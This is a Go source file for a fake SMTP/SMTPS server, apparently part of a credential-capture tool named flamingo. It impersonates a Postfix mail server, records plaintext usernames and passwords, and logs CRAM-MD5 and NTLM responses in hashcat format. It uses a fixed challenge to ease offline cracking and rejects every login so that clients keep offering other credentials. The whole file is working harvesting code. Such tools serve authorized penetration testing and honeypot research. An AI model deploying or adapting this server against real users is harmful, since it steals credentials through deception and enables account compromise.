package flamingo

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"maps"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/audibleblink/go-ntlm/ntlm"
	log "github.com/sirupsen/logrus"
)

// SMTPCramChallenge is the fixed CRAM-MD5 challenge presented to every
// client so captured responses can be cracked offline with precomputed
// material.
const SMTPCramChallenge = "<1896.flamingo@localhost>"

// smtpTimeout is the idle deadline applied to each client connection.
const smtpTimeout = 30 * time.Second

// smtpMaxLine caps the bytes kept from a single client line. SASL
// continuation lines carrying NTLM AUTHENTICATE messages are the largest.
const smtpMaxLine = 16384

// smtpMaxCommands bounds the number of commands accepted per session.
const smtpMaxCommands = 100

// smtpHostname is the server name used in the banner and EHLO reply.
const smtpHostname = "mail.localdomain"

// smtpAuthFail is the reply sent for every completed authentication attempt.
const smtpAuthFail = "535 5.7.8 Authentication credentials invalid"

// errSMTPAuthAborted reports a "*" SASL cancellation from the client.
var errSMTPAuthAborted = errors.New("authentication aborted")

// errSMTPAuthDecode reports a SASL response that is not valid base64.
var errSMTPAuthDecode = errors.New("cannot decode response")

// ConfSMTP describes the options for an SMTP capture service. The TLS flag
// selects implicit TLS (SMTPS); plaintext listeners offer STARTTLS when a
// certificate is configured.
type ConfSMTP struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter
	TLS          bool
	TLSName      string
	TLSCert      string
	TLSKey       string
	shutdown     bool
	listener     net.Listener
	m            sync.Mutex
}

// NewConfSMTP creates a default configuration for the SMTP capture server.
func NewConfSMTP() *ConfSMTP {
	return &ConfSMTP{
		BindPort: 25,
		BindHost: "[::]",
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfSMTP) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfSMTP) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if !c.shutdown {
		c.shutdown = true
		if c.listener != nil {
			c.listener.Close()
		}
	}
}

// SpawnSMTP starts a logging SMTP or SMTPS server.
func SpawnSMTP(c *ConfSMTP) error {
	addr := fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)

	if !c.TLS {
		listener, err := net.Listen("tcp", addr)
		if err != nil {
			return fmt.Errorf("failed to listen on %s (%s)", addr, err)
		}
		c.listener = listener
		log.Debugf("smtp is listening on %s", addr)
		go smtpStart(c)
		return nil
	}

	tlsConfig, err := c.tlsConfig()
	if err != nil {
		return fmt.Errorf("failed to load tls cert for smtps on %s (%s)", addr, err)
	}
	listener, err := tls.Listen("tcp", addr, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to listen with tls on %s (%s)", addr, err)
	}
	c.listener = listener
	log.Debugf("smtps is listening on %s", addr)
	go smtpStart(c)
	return nil
}

// tlsConfig builds a server TLS configuration from the configured key pair.
func (c *ConfSMTP) tlsConfig() (*tls.Config, error) {
	kp, err := tls.X509KeyPair([]byte(c.TLSCert), []byte(c.TLSKey))
	if err != nil {
		return nil, err
	}
	return &tls.Config{
		ServerName:   c.TLSName,
		Certificates: []tls.Certificate{kp},
	}, nil
}

// smtpStart accepts connections until the service shuts down.
func smtpStart(c *ConfSMTP) {
	for !c.IsShutdown() {
		conn, err := c.listener.Accept()
		if err != nil {
			continue
		}
		go smtpHandleConnection(c, conn)
	}
}

// pname returns the protocol name used in credential records.
func (c *ConfSMTP) pname() string {
	if c.TLS {
		return "smtps"
	}
	return "smtp"
}

// record logs a captured credential with the given method and fields.
func (c *ConfSMTP) record(conn net.Conn, method string, fields map[string]string) {
	rec := map[string]string{
		"_server": fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"method":  method,
	}
	maps.Copy(rec, fields)
	c.RecordWriter.Record("credential", c.pname(), conn.RemoteAddr().String(), rec)
}

// smtpSession tracks the state of a single client connection.
type smtpSession struct {
	conf      *ConfSMTP
	conn      net.Conn
	reader    *bufio.Reader
	writer    *bufio.Writer
	encrypted bool
	helo      string
}

// canStartTLS reports whether the connection can still be upgraded to TLS.
func (s *smtpSession) canStartTLS() bool {
	return !s.encrypted && s.conf.TLSCert != ""
}

// reply writes a single response line to the client.
func (s *smtpSession) reply(format string, args ...any) {
	fmt.Fprintf(s.writer, format+"\r\n", args...)
	s.writer.Flush()
}

// replyMulti writes a multi-line response with the given status code.
func (s *smtpSession) replyMulti(code string, lines []string) {
	for i, line := range lines {
		sep := "-"
		if i == len(lines)-1 {
			sep = " "
		}
		fmt.Fprintf(s.writer, "%s%s%s\r\n", code, sep, line)
	}
	s.writer.Flush()
}

// readLine reads one line from the client with the trailing CRLF removed,
// keeping at most smtpMaxLine bytes of it.
func (s *smtpSession) readLine() (string, error) {
	var buf []byte
	for {
		b, err := s.reader.ReadSlice('\n')
		if room := smtpMaxLine - len(buf); room > 0 {
			if len(b) > room {
				b = b[:room]
			}
			buf = append(buf, b...)
		}
		if err == bufio.ErrBufferFull {
			continue
		}
		if err != nil {
			return "", err
		}
		return strings.TrimRight(string(buf), "\r\n"), nil
	}
}

// record logs a credential for this session, adding the EHLO name when the
// client sent one.
func (s *smtpSession) record(method string, fields map[string]string) {
	if s.helo != "" {
		fields["ehlo"] = s.helo
	}
	s.conf.record(s.conn, method, fields)
}

// smtpHandleConnection greets the client and runs the command loop until
// the client disconnects, quits, or times out.
func smtpHandleConnection(c *ConfSMTP, conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(smtpTimeout))

	s := &smtpSession{
		conf:      c,
		conn:      conn,
		reader:    bufio.NewReader(conn),
		writer:    bufio.NewWriter(conn),
		encrypted: c.TLS,
	}
	s.reply("220 %s ESMTP Postfix (Ubuntu)", smtpHostname)
	s.commandLoop()
}

// commandLoop handles commands until the connection ends. Authentication
// attempts are recorded and rejected so a client will retry with any other
// credentials or mechanisms it has. Mail is never accepted.
func (s *smtpSession) commandLoop() {
	for i := 0; i < smtpMaxCommands; i++ {
		line, err := s.readLine()
		if err != nil {
			return
		}
		verb, arg, _ := strings.Cut(line, " ")
		verb = strings.ToUpper(verb)
		arg = strings.TrimSpace(arg)

		switch verb {
		case "EHLO", "HELO":
			if arg == "" {
				s.reply("501 Syntax: %s hostname", verb)
				continue
			}
			s.helo = arg
			if verb == "HELO" {
				s.reply("250 %s", smtpHostname)
				continue
			}
			ext := []string{smtpHostname, "PIPELINING", "SIZE 10240000"}
			if s.canStartTLS() {
				ext = append(ext, "STARTTLS")
			}
			ext = append(ext, "AUTH PLAIN LOGIN CRAM-MD5 NTLM", "ENHANCEDSTATUSCODES", "8BITMIME")
			s.replyMulti("250", ext)

		case "STARTTLS":
			if s.encrypted {
				s.reply("554 5.5.1 Error: TLS already active")
				continue
			}
			if !s.canStartTLS() {
				s.reply("454 4.7.0 TLS not available due to local problem")
				continue
			}
			s.reply("220 2.0.0 Ready to start TLS")
			if err := s.startTLS(); err != nil {
				log.Debugf("smtp starttls failed from %s: %s", s.conn.RemoteAddr(), err)
				return
			}
			s.helo = ""

		case "AUTH":
			if s.helo == "" {
				s.reply("503 5.5.1 Error: send HELO/EHLO first")
				continue
			}
			if err := s.auth(arg); err != nil {
				return
			}

		case "MAIL":
			s.reply("530 5.7.0 Authentication required")

		case "RCPT", "DATA":
			s.reply("503 5.5.1 Error: need MAIL command")

		case "RSET", "NOOP":
			s.reply("250 2.0.0 Ok")

		case "HELP":
			s.reply("214 2.0.0 Commands: EHLO HELO STARTTLS AUTH MAIL RSET NOOP HELP QUIT")

		case "QUIT":
			s.reply("221 2.0.0 Bye")
			return

		case "":
			s.reply("500 5.5.2 Error: bad syntax")

		default:
			s.reply("502 5.5.2 Error: command not recognized")
		}
	}
	s.reply("421 4.7.0 %s Error: too many commands", smtpHostname)
}

// startTLS upgrades the connection in place. The client resumes the same
// session over TLS and must send EHLO again.
func (s *smtpSession) startTLS() error {
	tlsConfig, err := s.conf.tlsConfig()
	if err != nil {
		return err
	}
	tlsConn := tls.Server(s.conn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		return err
	}
	tlsConn.SetDeadline(time.Now().Add(smtpTimeout))
	s.conn = tlsConn
	s.reader = bufio.NewReader(tlsConn)
	s.writer = bufio.NewWriter(tlsConn)
	s.encrypted = true
	return nil
}

// auth dispatches an AUTH command of the form "<mechanism> [initial-response]".
// A returned error means the connection is unusable and the session ends.
func (s *smtpSession) auth(arg string) error {
	mech, initial, _ := strings.Cut(arg, " ")
	initial = strings.TrimSpace(initial)
	switch strings.ToUpper(mech) {
	case "PLAIN":
		return s.authPlain(initial)
	case "LOGIN":
		return s.authLogin(initial)
	case "CRAM-MD5":
		return s.authCramMD5()
	case "NTLM":
		return s.authNTLM(initial)
	}
	s.reply("535 5.7.8 Error: authentication failed: Invalid authentication mechanism")
	return nil
}

// smtpDecodeSASL decodes a SASL response line. An empty response is sent as
// "=" and padding is optional. A "*" is a client cancellation.
func smtpDecodeSASL(line string) ([]byte, error) {
	switch line {
	case "*":
		return nil, errSMTPAuthAborted
	case "=":
		return nil, nil
	}
	b, err := base64.StdEncoding.DecodeString(line)
	if err != nil {
		b, err = base64.RawStdEncoding.DecodeString(line)
	}
	if err != nil {
		return nil, errSMTPAuthDecode
	}
	return b, nil
}

// continuation sends a 334 server challenge and returns the decoded client
// response.
func (s *smtpSession) continuation(prompt string) ([]byte, error) {
	s.reply("334 %s", prompt)
	line, err := s.readLine()
	if err != nil {
		return nil, err
	}
	return smtpDecodeSASL(strings.TrimSpace(line))
}

// initialOrContinuation decodes an initial response sent with the AUTH
// command, or requests one with the given prompt when none was supplied.
func (s *smtpSession) initialOrContinuation(initial, prompt string) ([]byte, error) {
	if initial != "" {
		return smtpDecodeSASL(initial)
	}
	return s.continuation(prompt)
}

// rejectAuth sends the reply for a finished exchange: a cancellation, an
// undecodable response, or a captured credential. Connection errors are
// returned so the session ends.
func (s *smtpSession) rejectAuth(err error) error {
	switch {
	case err == nil:
		s.reply(smtpAuthFail)
	case errors.Is(err, errSMTPAuthAborted):
		s.reply("501 5.7.0 Authentication aborted")
	case errors.Is(err, errSMTPAuthDecode):
		s.reply("501 5.5.2 Cannot decode response")
	default:
		return err
	}
	return nil
}

// authPlain handles AUTH PLAIN. The credential arrives either as an inline
// initial response or after a continuation, decoding to
// "[authzid]\x00authcid\x00password".
func (s *smtpSession) authPlain(initial string) error {
	decoded, err := s.initialOrContinuation(initial, "")
	if err != nil {
		return s.rejectAuth(err)
	}

	fields := strings.Split(string(decoded), "\x00")
	user, pass := "", ""
	switch len(fields) {
	case 3:
		user, pass = fields[1], fields[2]
	case 2:
		user, pass = fields[0], fields[1]
	default:
		user = string(decoded)
	}
	s.record("AUTH PLAIN", map[string]string{
		"username": user,
		"password": pass,
	})
	return s.rejectAuth(nil)
}

// authLogin handles AUTH LOGIN, prompting for a base64 username and password
// in turn. An inline initial response supplies the username.
func (s *smtpSession) authLogin(initial string) error {
	user, err := s.initialOrContinuation(initial, base64.StdEncoding.EncodeToString([]byte("Username:")))
	if err != nil {
		return s.rejectAuth(err)
	}
	pass, err := s.continuation(base64.StdEncoding.EncodeToString([]byte("Password:")))
	if err != nil {
		return s.rejectAuth(err)
	}

	s.record("AUTH LOGIN", map[string]string{
		"username": string(user),
		"password": string(pass),
	})
	return s.rejectAuth(nil)
}

// authCramMD5 handles AUTH CRAM-MD5. The client returns
// HMAC-MD5(password, challenge), which is recorded in hashcat mode 10200
// format for offline cracking.
func (s *smtpSession) authCramMD5() error {
	challB64 := base64.StdEncoding.EncodeToString([]byte(SMTPCramChallenge))
	decoded, err := s.continuation(challB64)
	if err != nil {
		return s.rejectAuth(err)
	}

	// The decoded response is "<username> <hex-hmac-md5>"
	username, hexHMAC := string(decoded), ""
	if sp := strings.LastIndexByte(username, ' '); sp >= 0 {
		username, hexHMAC = username[:sp], username[sp+1:]
	}

	s.record("AUTH CRAM-MD5", map[string]string{
		"username":  username,
		"challenge": SMTPCramChallenge,
		"response":  hexHMAC,
		"hashcat":   fmt.Sprintf("$cram_md5$%s$%s", challB64, base64.StdEncoding.EncodeToString(decoded)),
	})
	return s.rejectAuth(nil)
}

// authNTLM handles AUTH NTLM as described in MS-SMTPNTHT. The client's
// NEGOTIATE arrives inline or after an empty 334, the fixed NTLMChallenge is
// returned, and the AUTHENTICATE response is recorded in hashcat form.
func (s *smtpSession) authNTLM(initial string) error {
	msg, err := s.initialOrContinuation(initial, "")
	if err != nil {
		return s.rejectAuth(err)
	}
	if smtpNTLMType(msg) == 1 {
		msg, err = s.continuation(NTLMChallenge)
		if err != nil {
			return s.rejectAuth(err)
		}
	}
	if smtpNTLMType(msg) != 3 {
		return s.rejectAuth(errSMTPAuthDecode)
	}

	hashType := smtpNTLMHashType(msg)
	auth, err := smtpNTLMParse(msg, hashType)
	if err != nil {
		return s.rejectAuth(errSMTPAuthDecode)
	}

	fields := map[string]string{
		"username": auth.UserName.String(),
		"hashcat":  ntlmToHashcat(auth, hashType),
	}
	if domain := auth.DomainName.String(); domain != "" {
		fields["domain"] = domain
	}
	if ws := auth.Workstation.String(); ws != "" {
		fields["workstation"] = ws
	}
	s.record("AUTH NTLM", fields)
	return s.rejectAuth(nil)
}

// smtpNTLMType returns the NTLMSSP message type, or 0 when the bytes are not
// an NTLMSSP message.
func smtpNTLMType(b []byte) uint32 {
	if len(b) < 12 || string(b[:8]) != "NTLMSSP\x00" {
		return 0
	}
	return binary.LittleEndian.Uint32(b[8:12])
}

// smtpNTLMHashType reports 1 for an NTLMv1 AUTHENTICATE message, identified
// by a 24 byte NT response, and 2 otherwise.
func smtpNTLMHashType(b []byte) int {
	if len(b) > 22 && binary.LittleEndian.Uint16(b[20:22]) == 24 {
		return 1
	}
	return 2
}

// smtpNTLMParse decodes an AUTHENTICATE message, converting the panics the
// parser raises on truncated input into an error.
func smtpNTLMParse(b []byte, hashType int) (auth *ntlm.AuthenticateMessage, err error) {
	defer func() {
		if r := recover(); r != nil {
			auth, err = nil, fmt.Errorf("malformed NTLM message: %v", r)
		}
	}()
	return ntlm.ParseAuthenticateMessage(b, hashType)
}
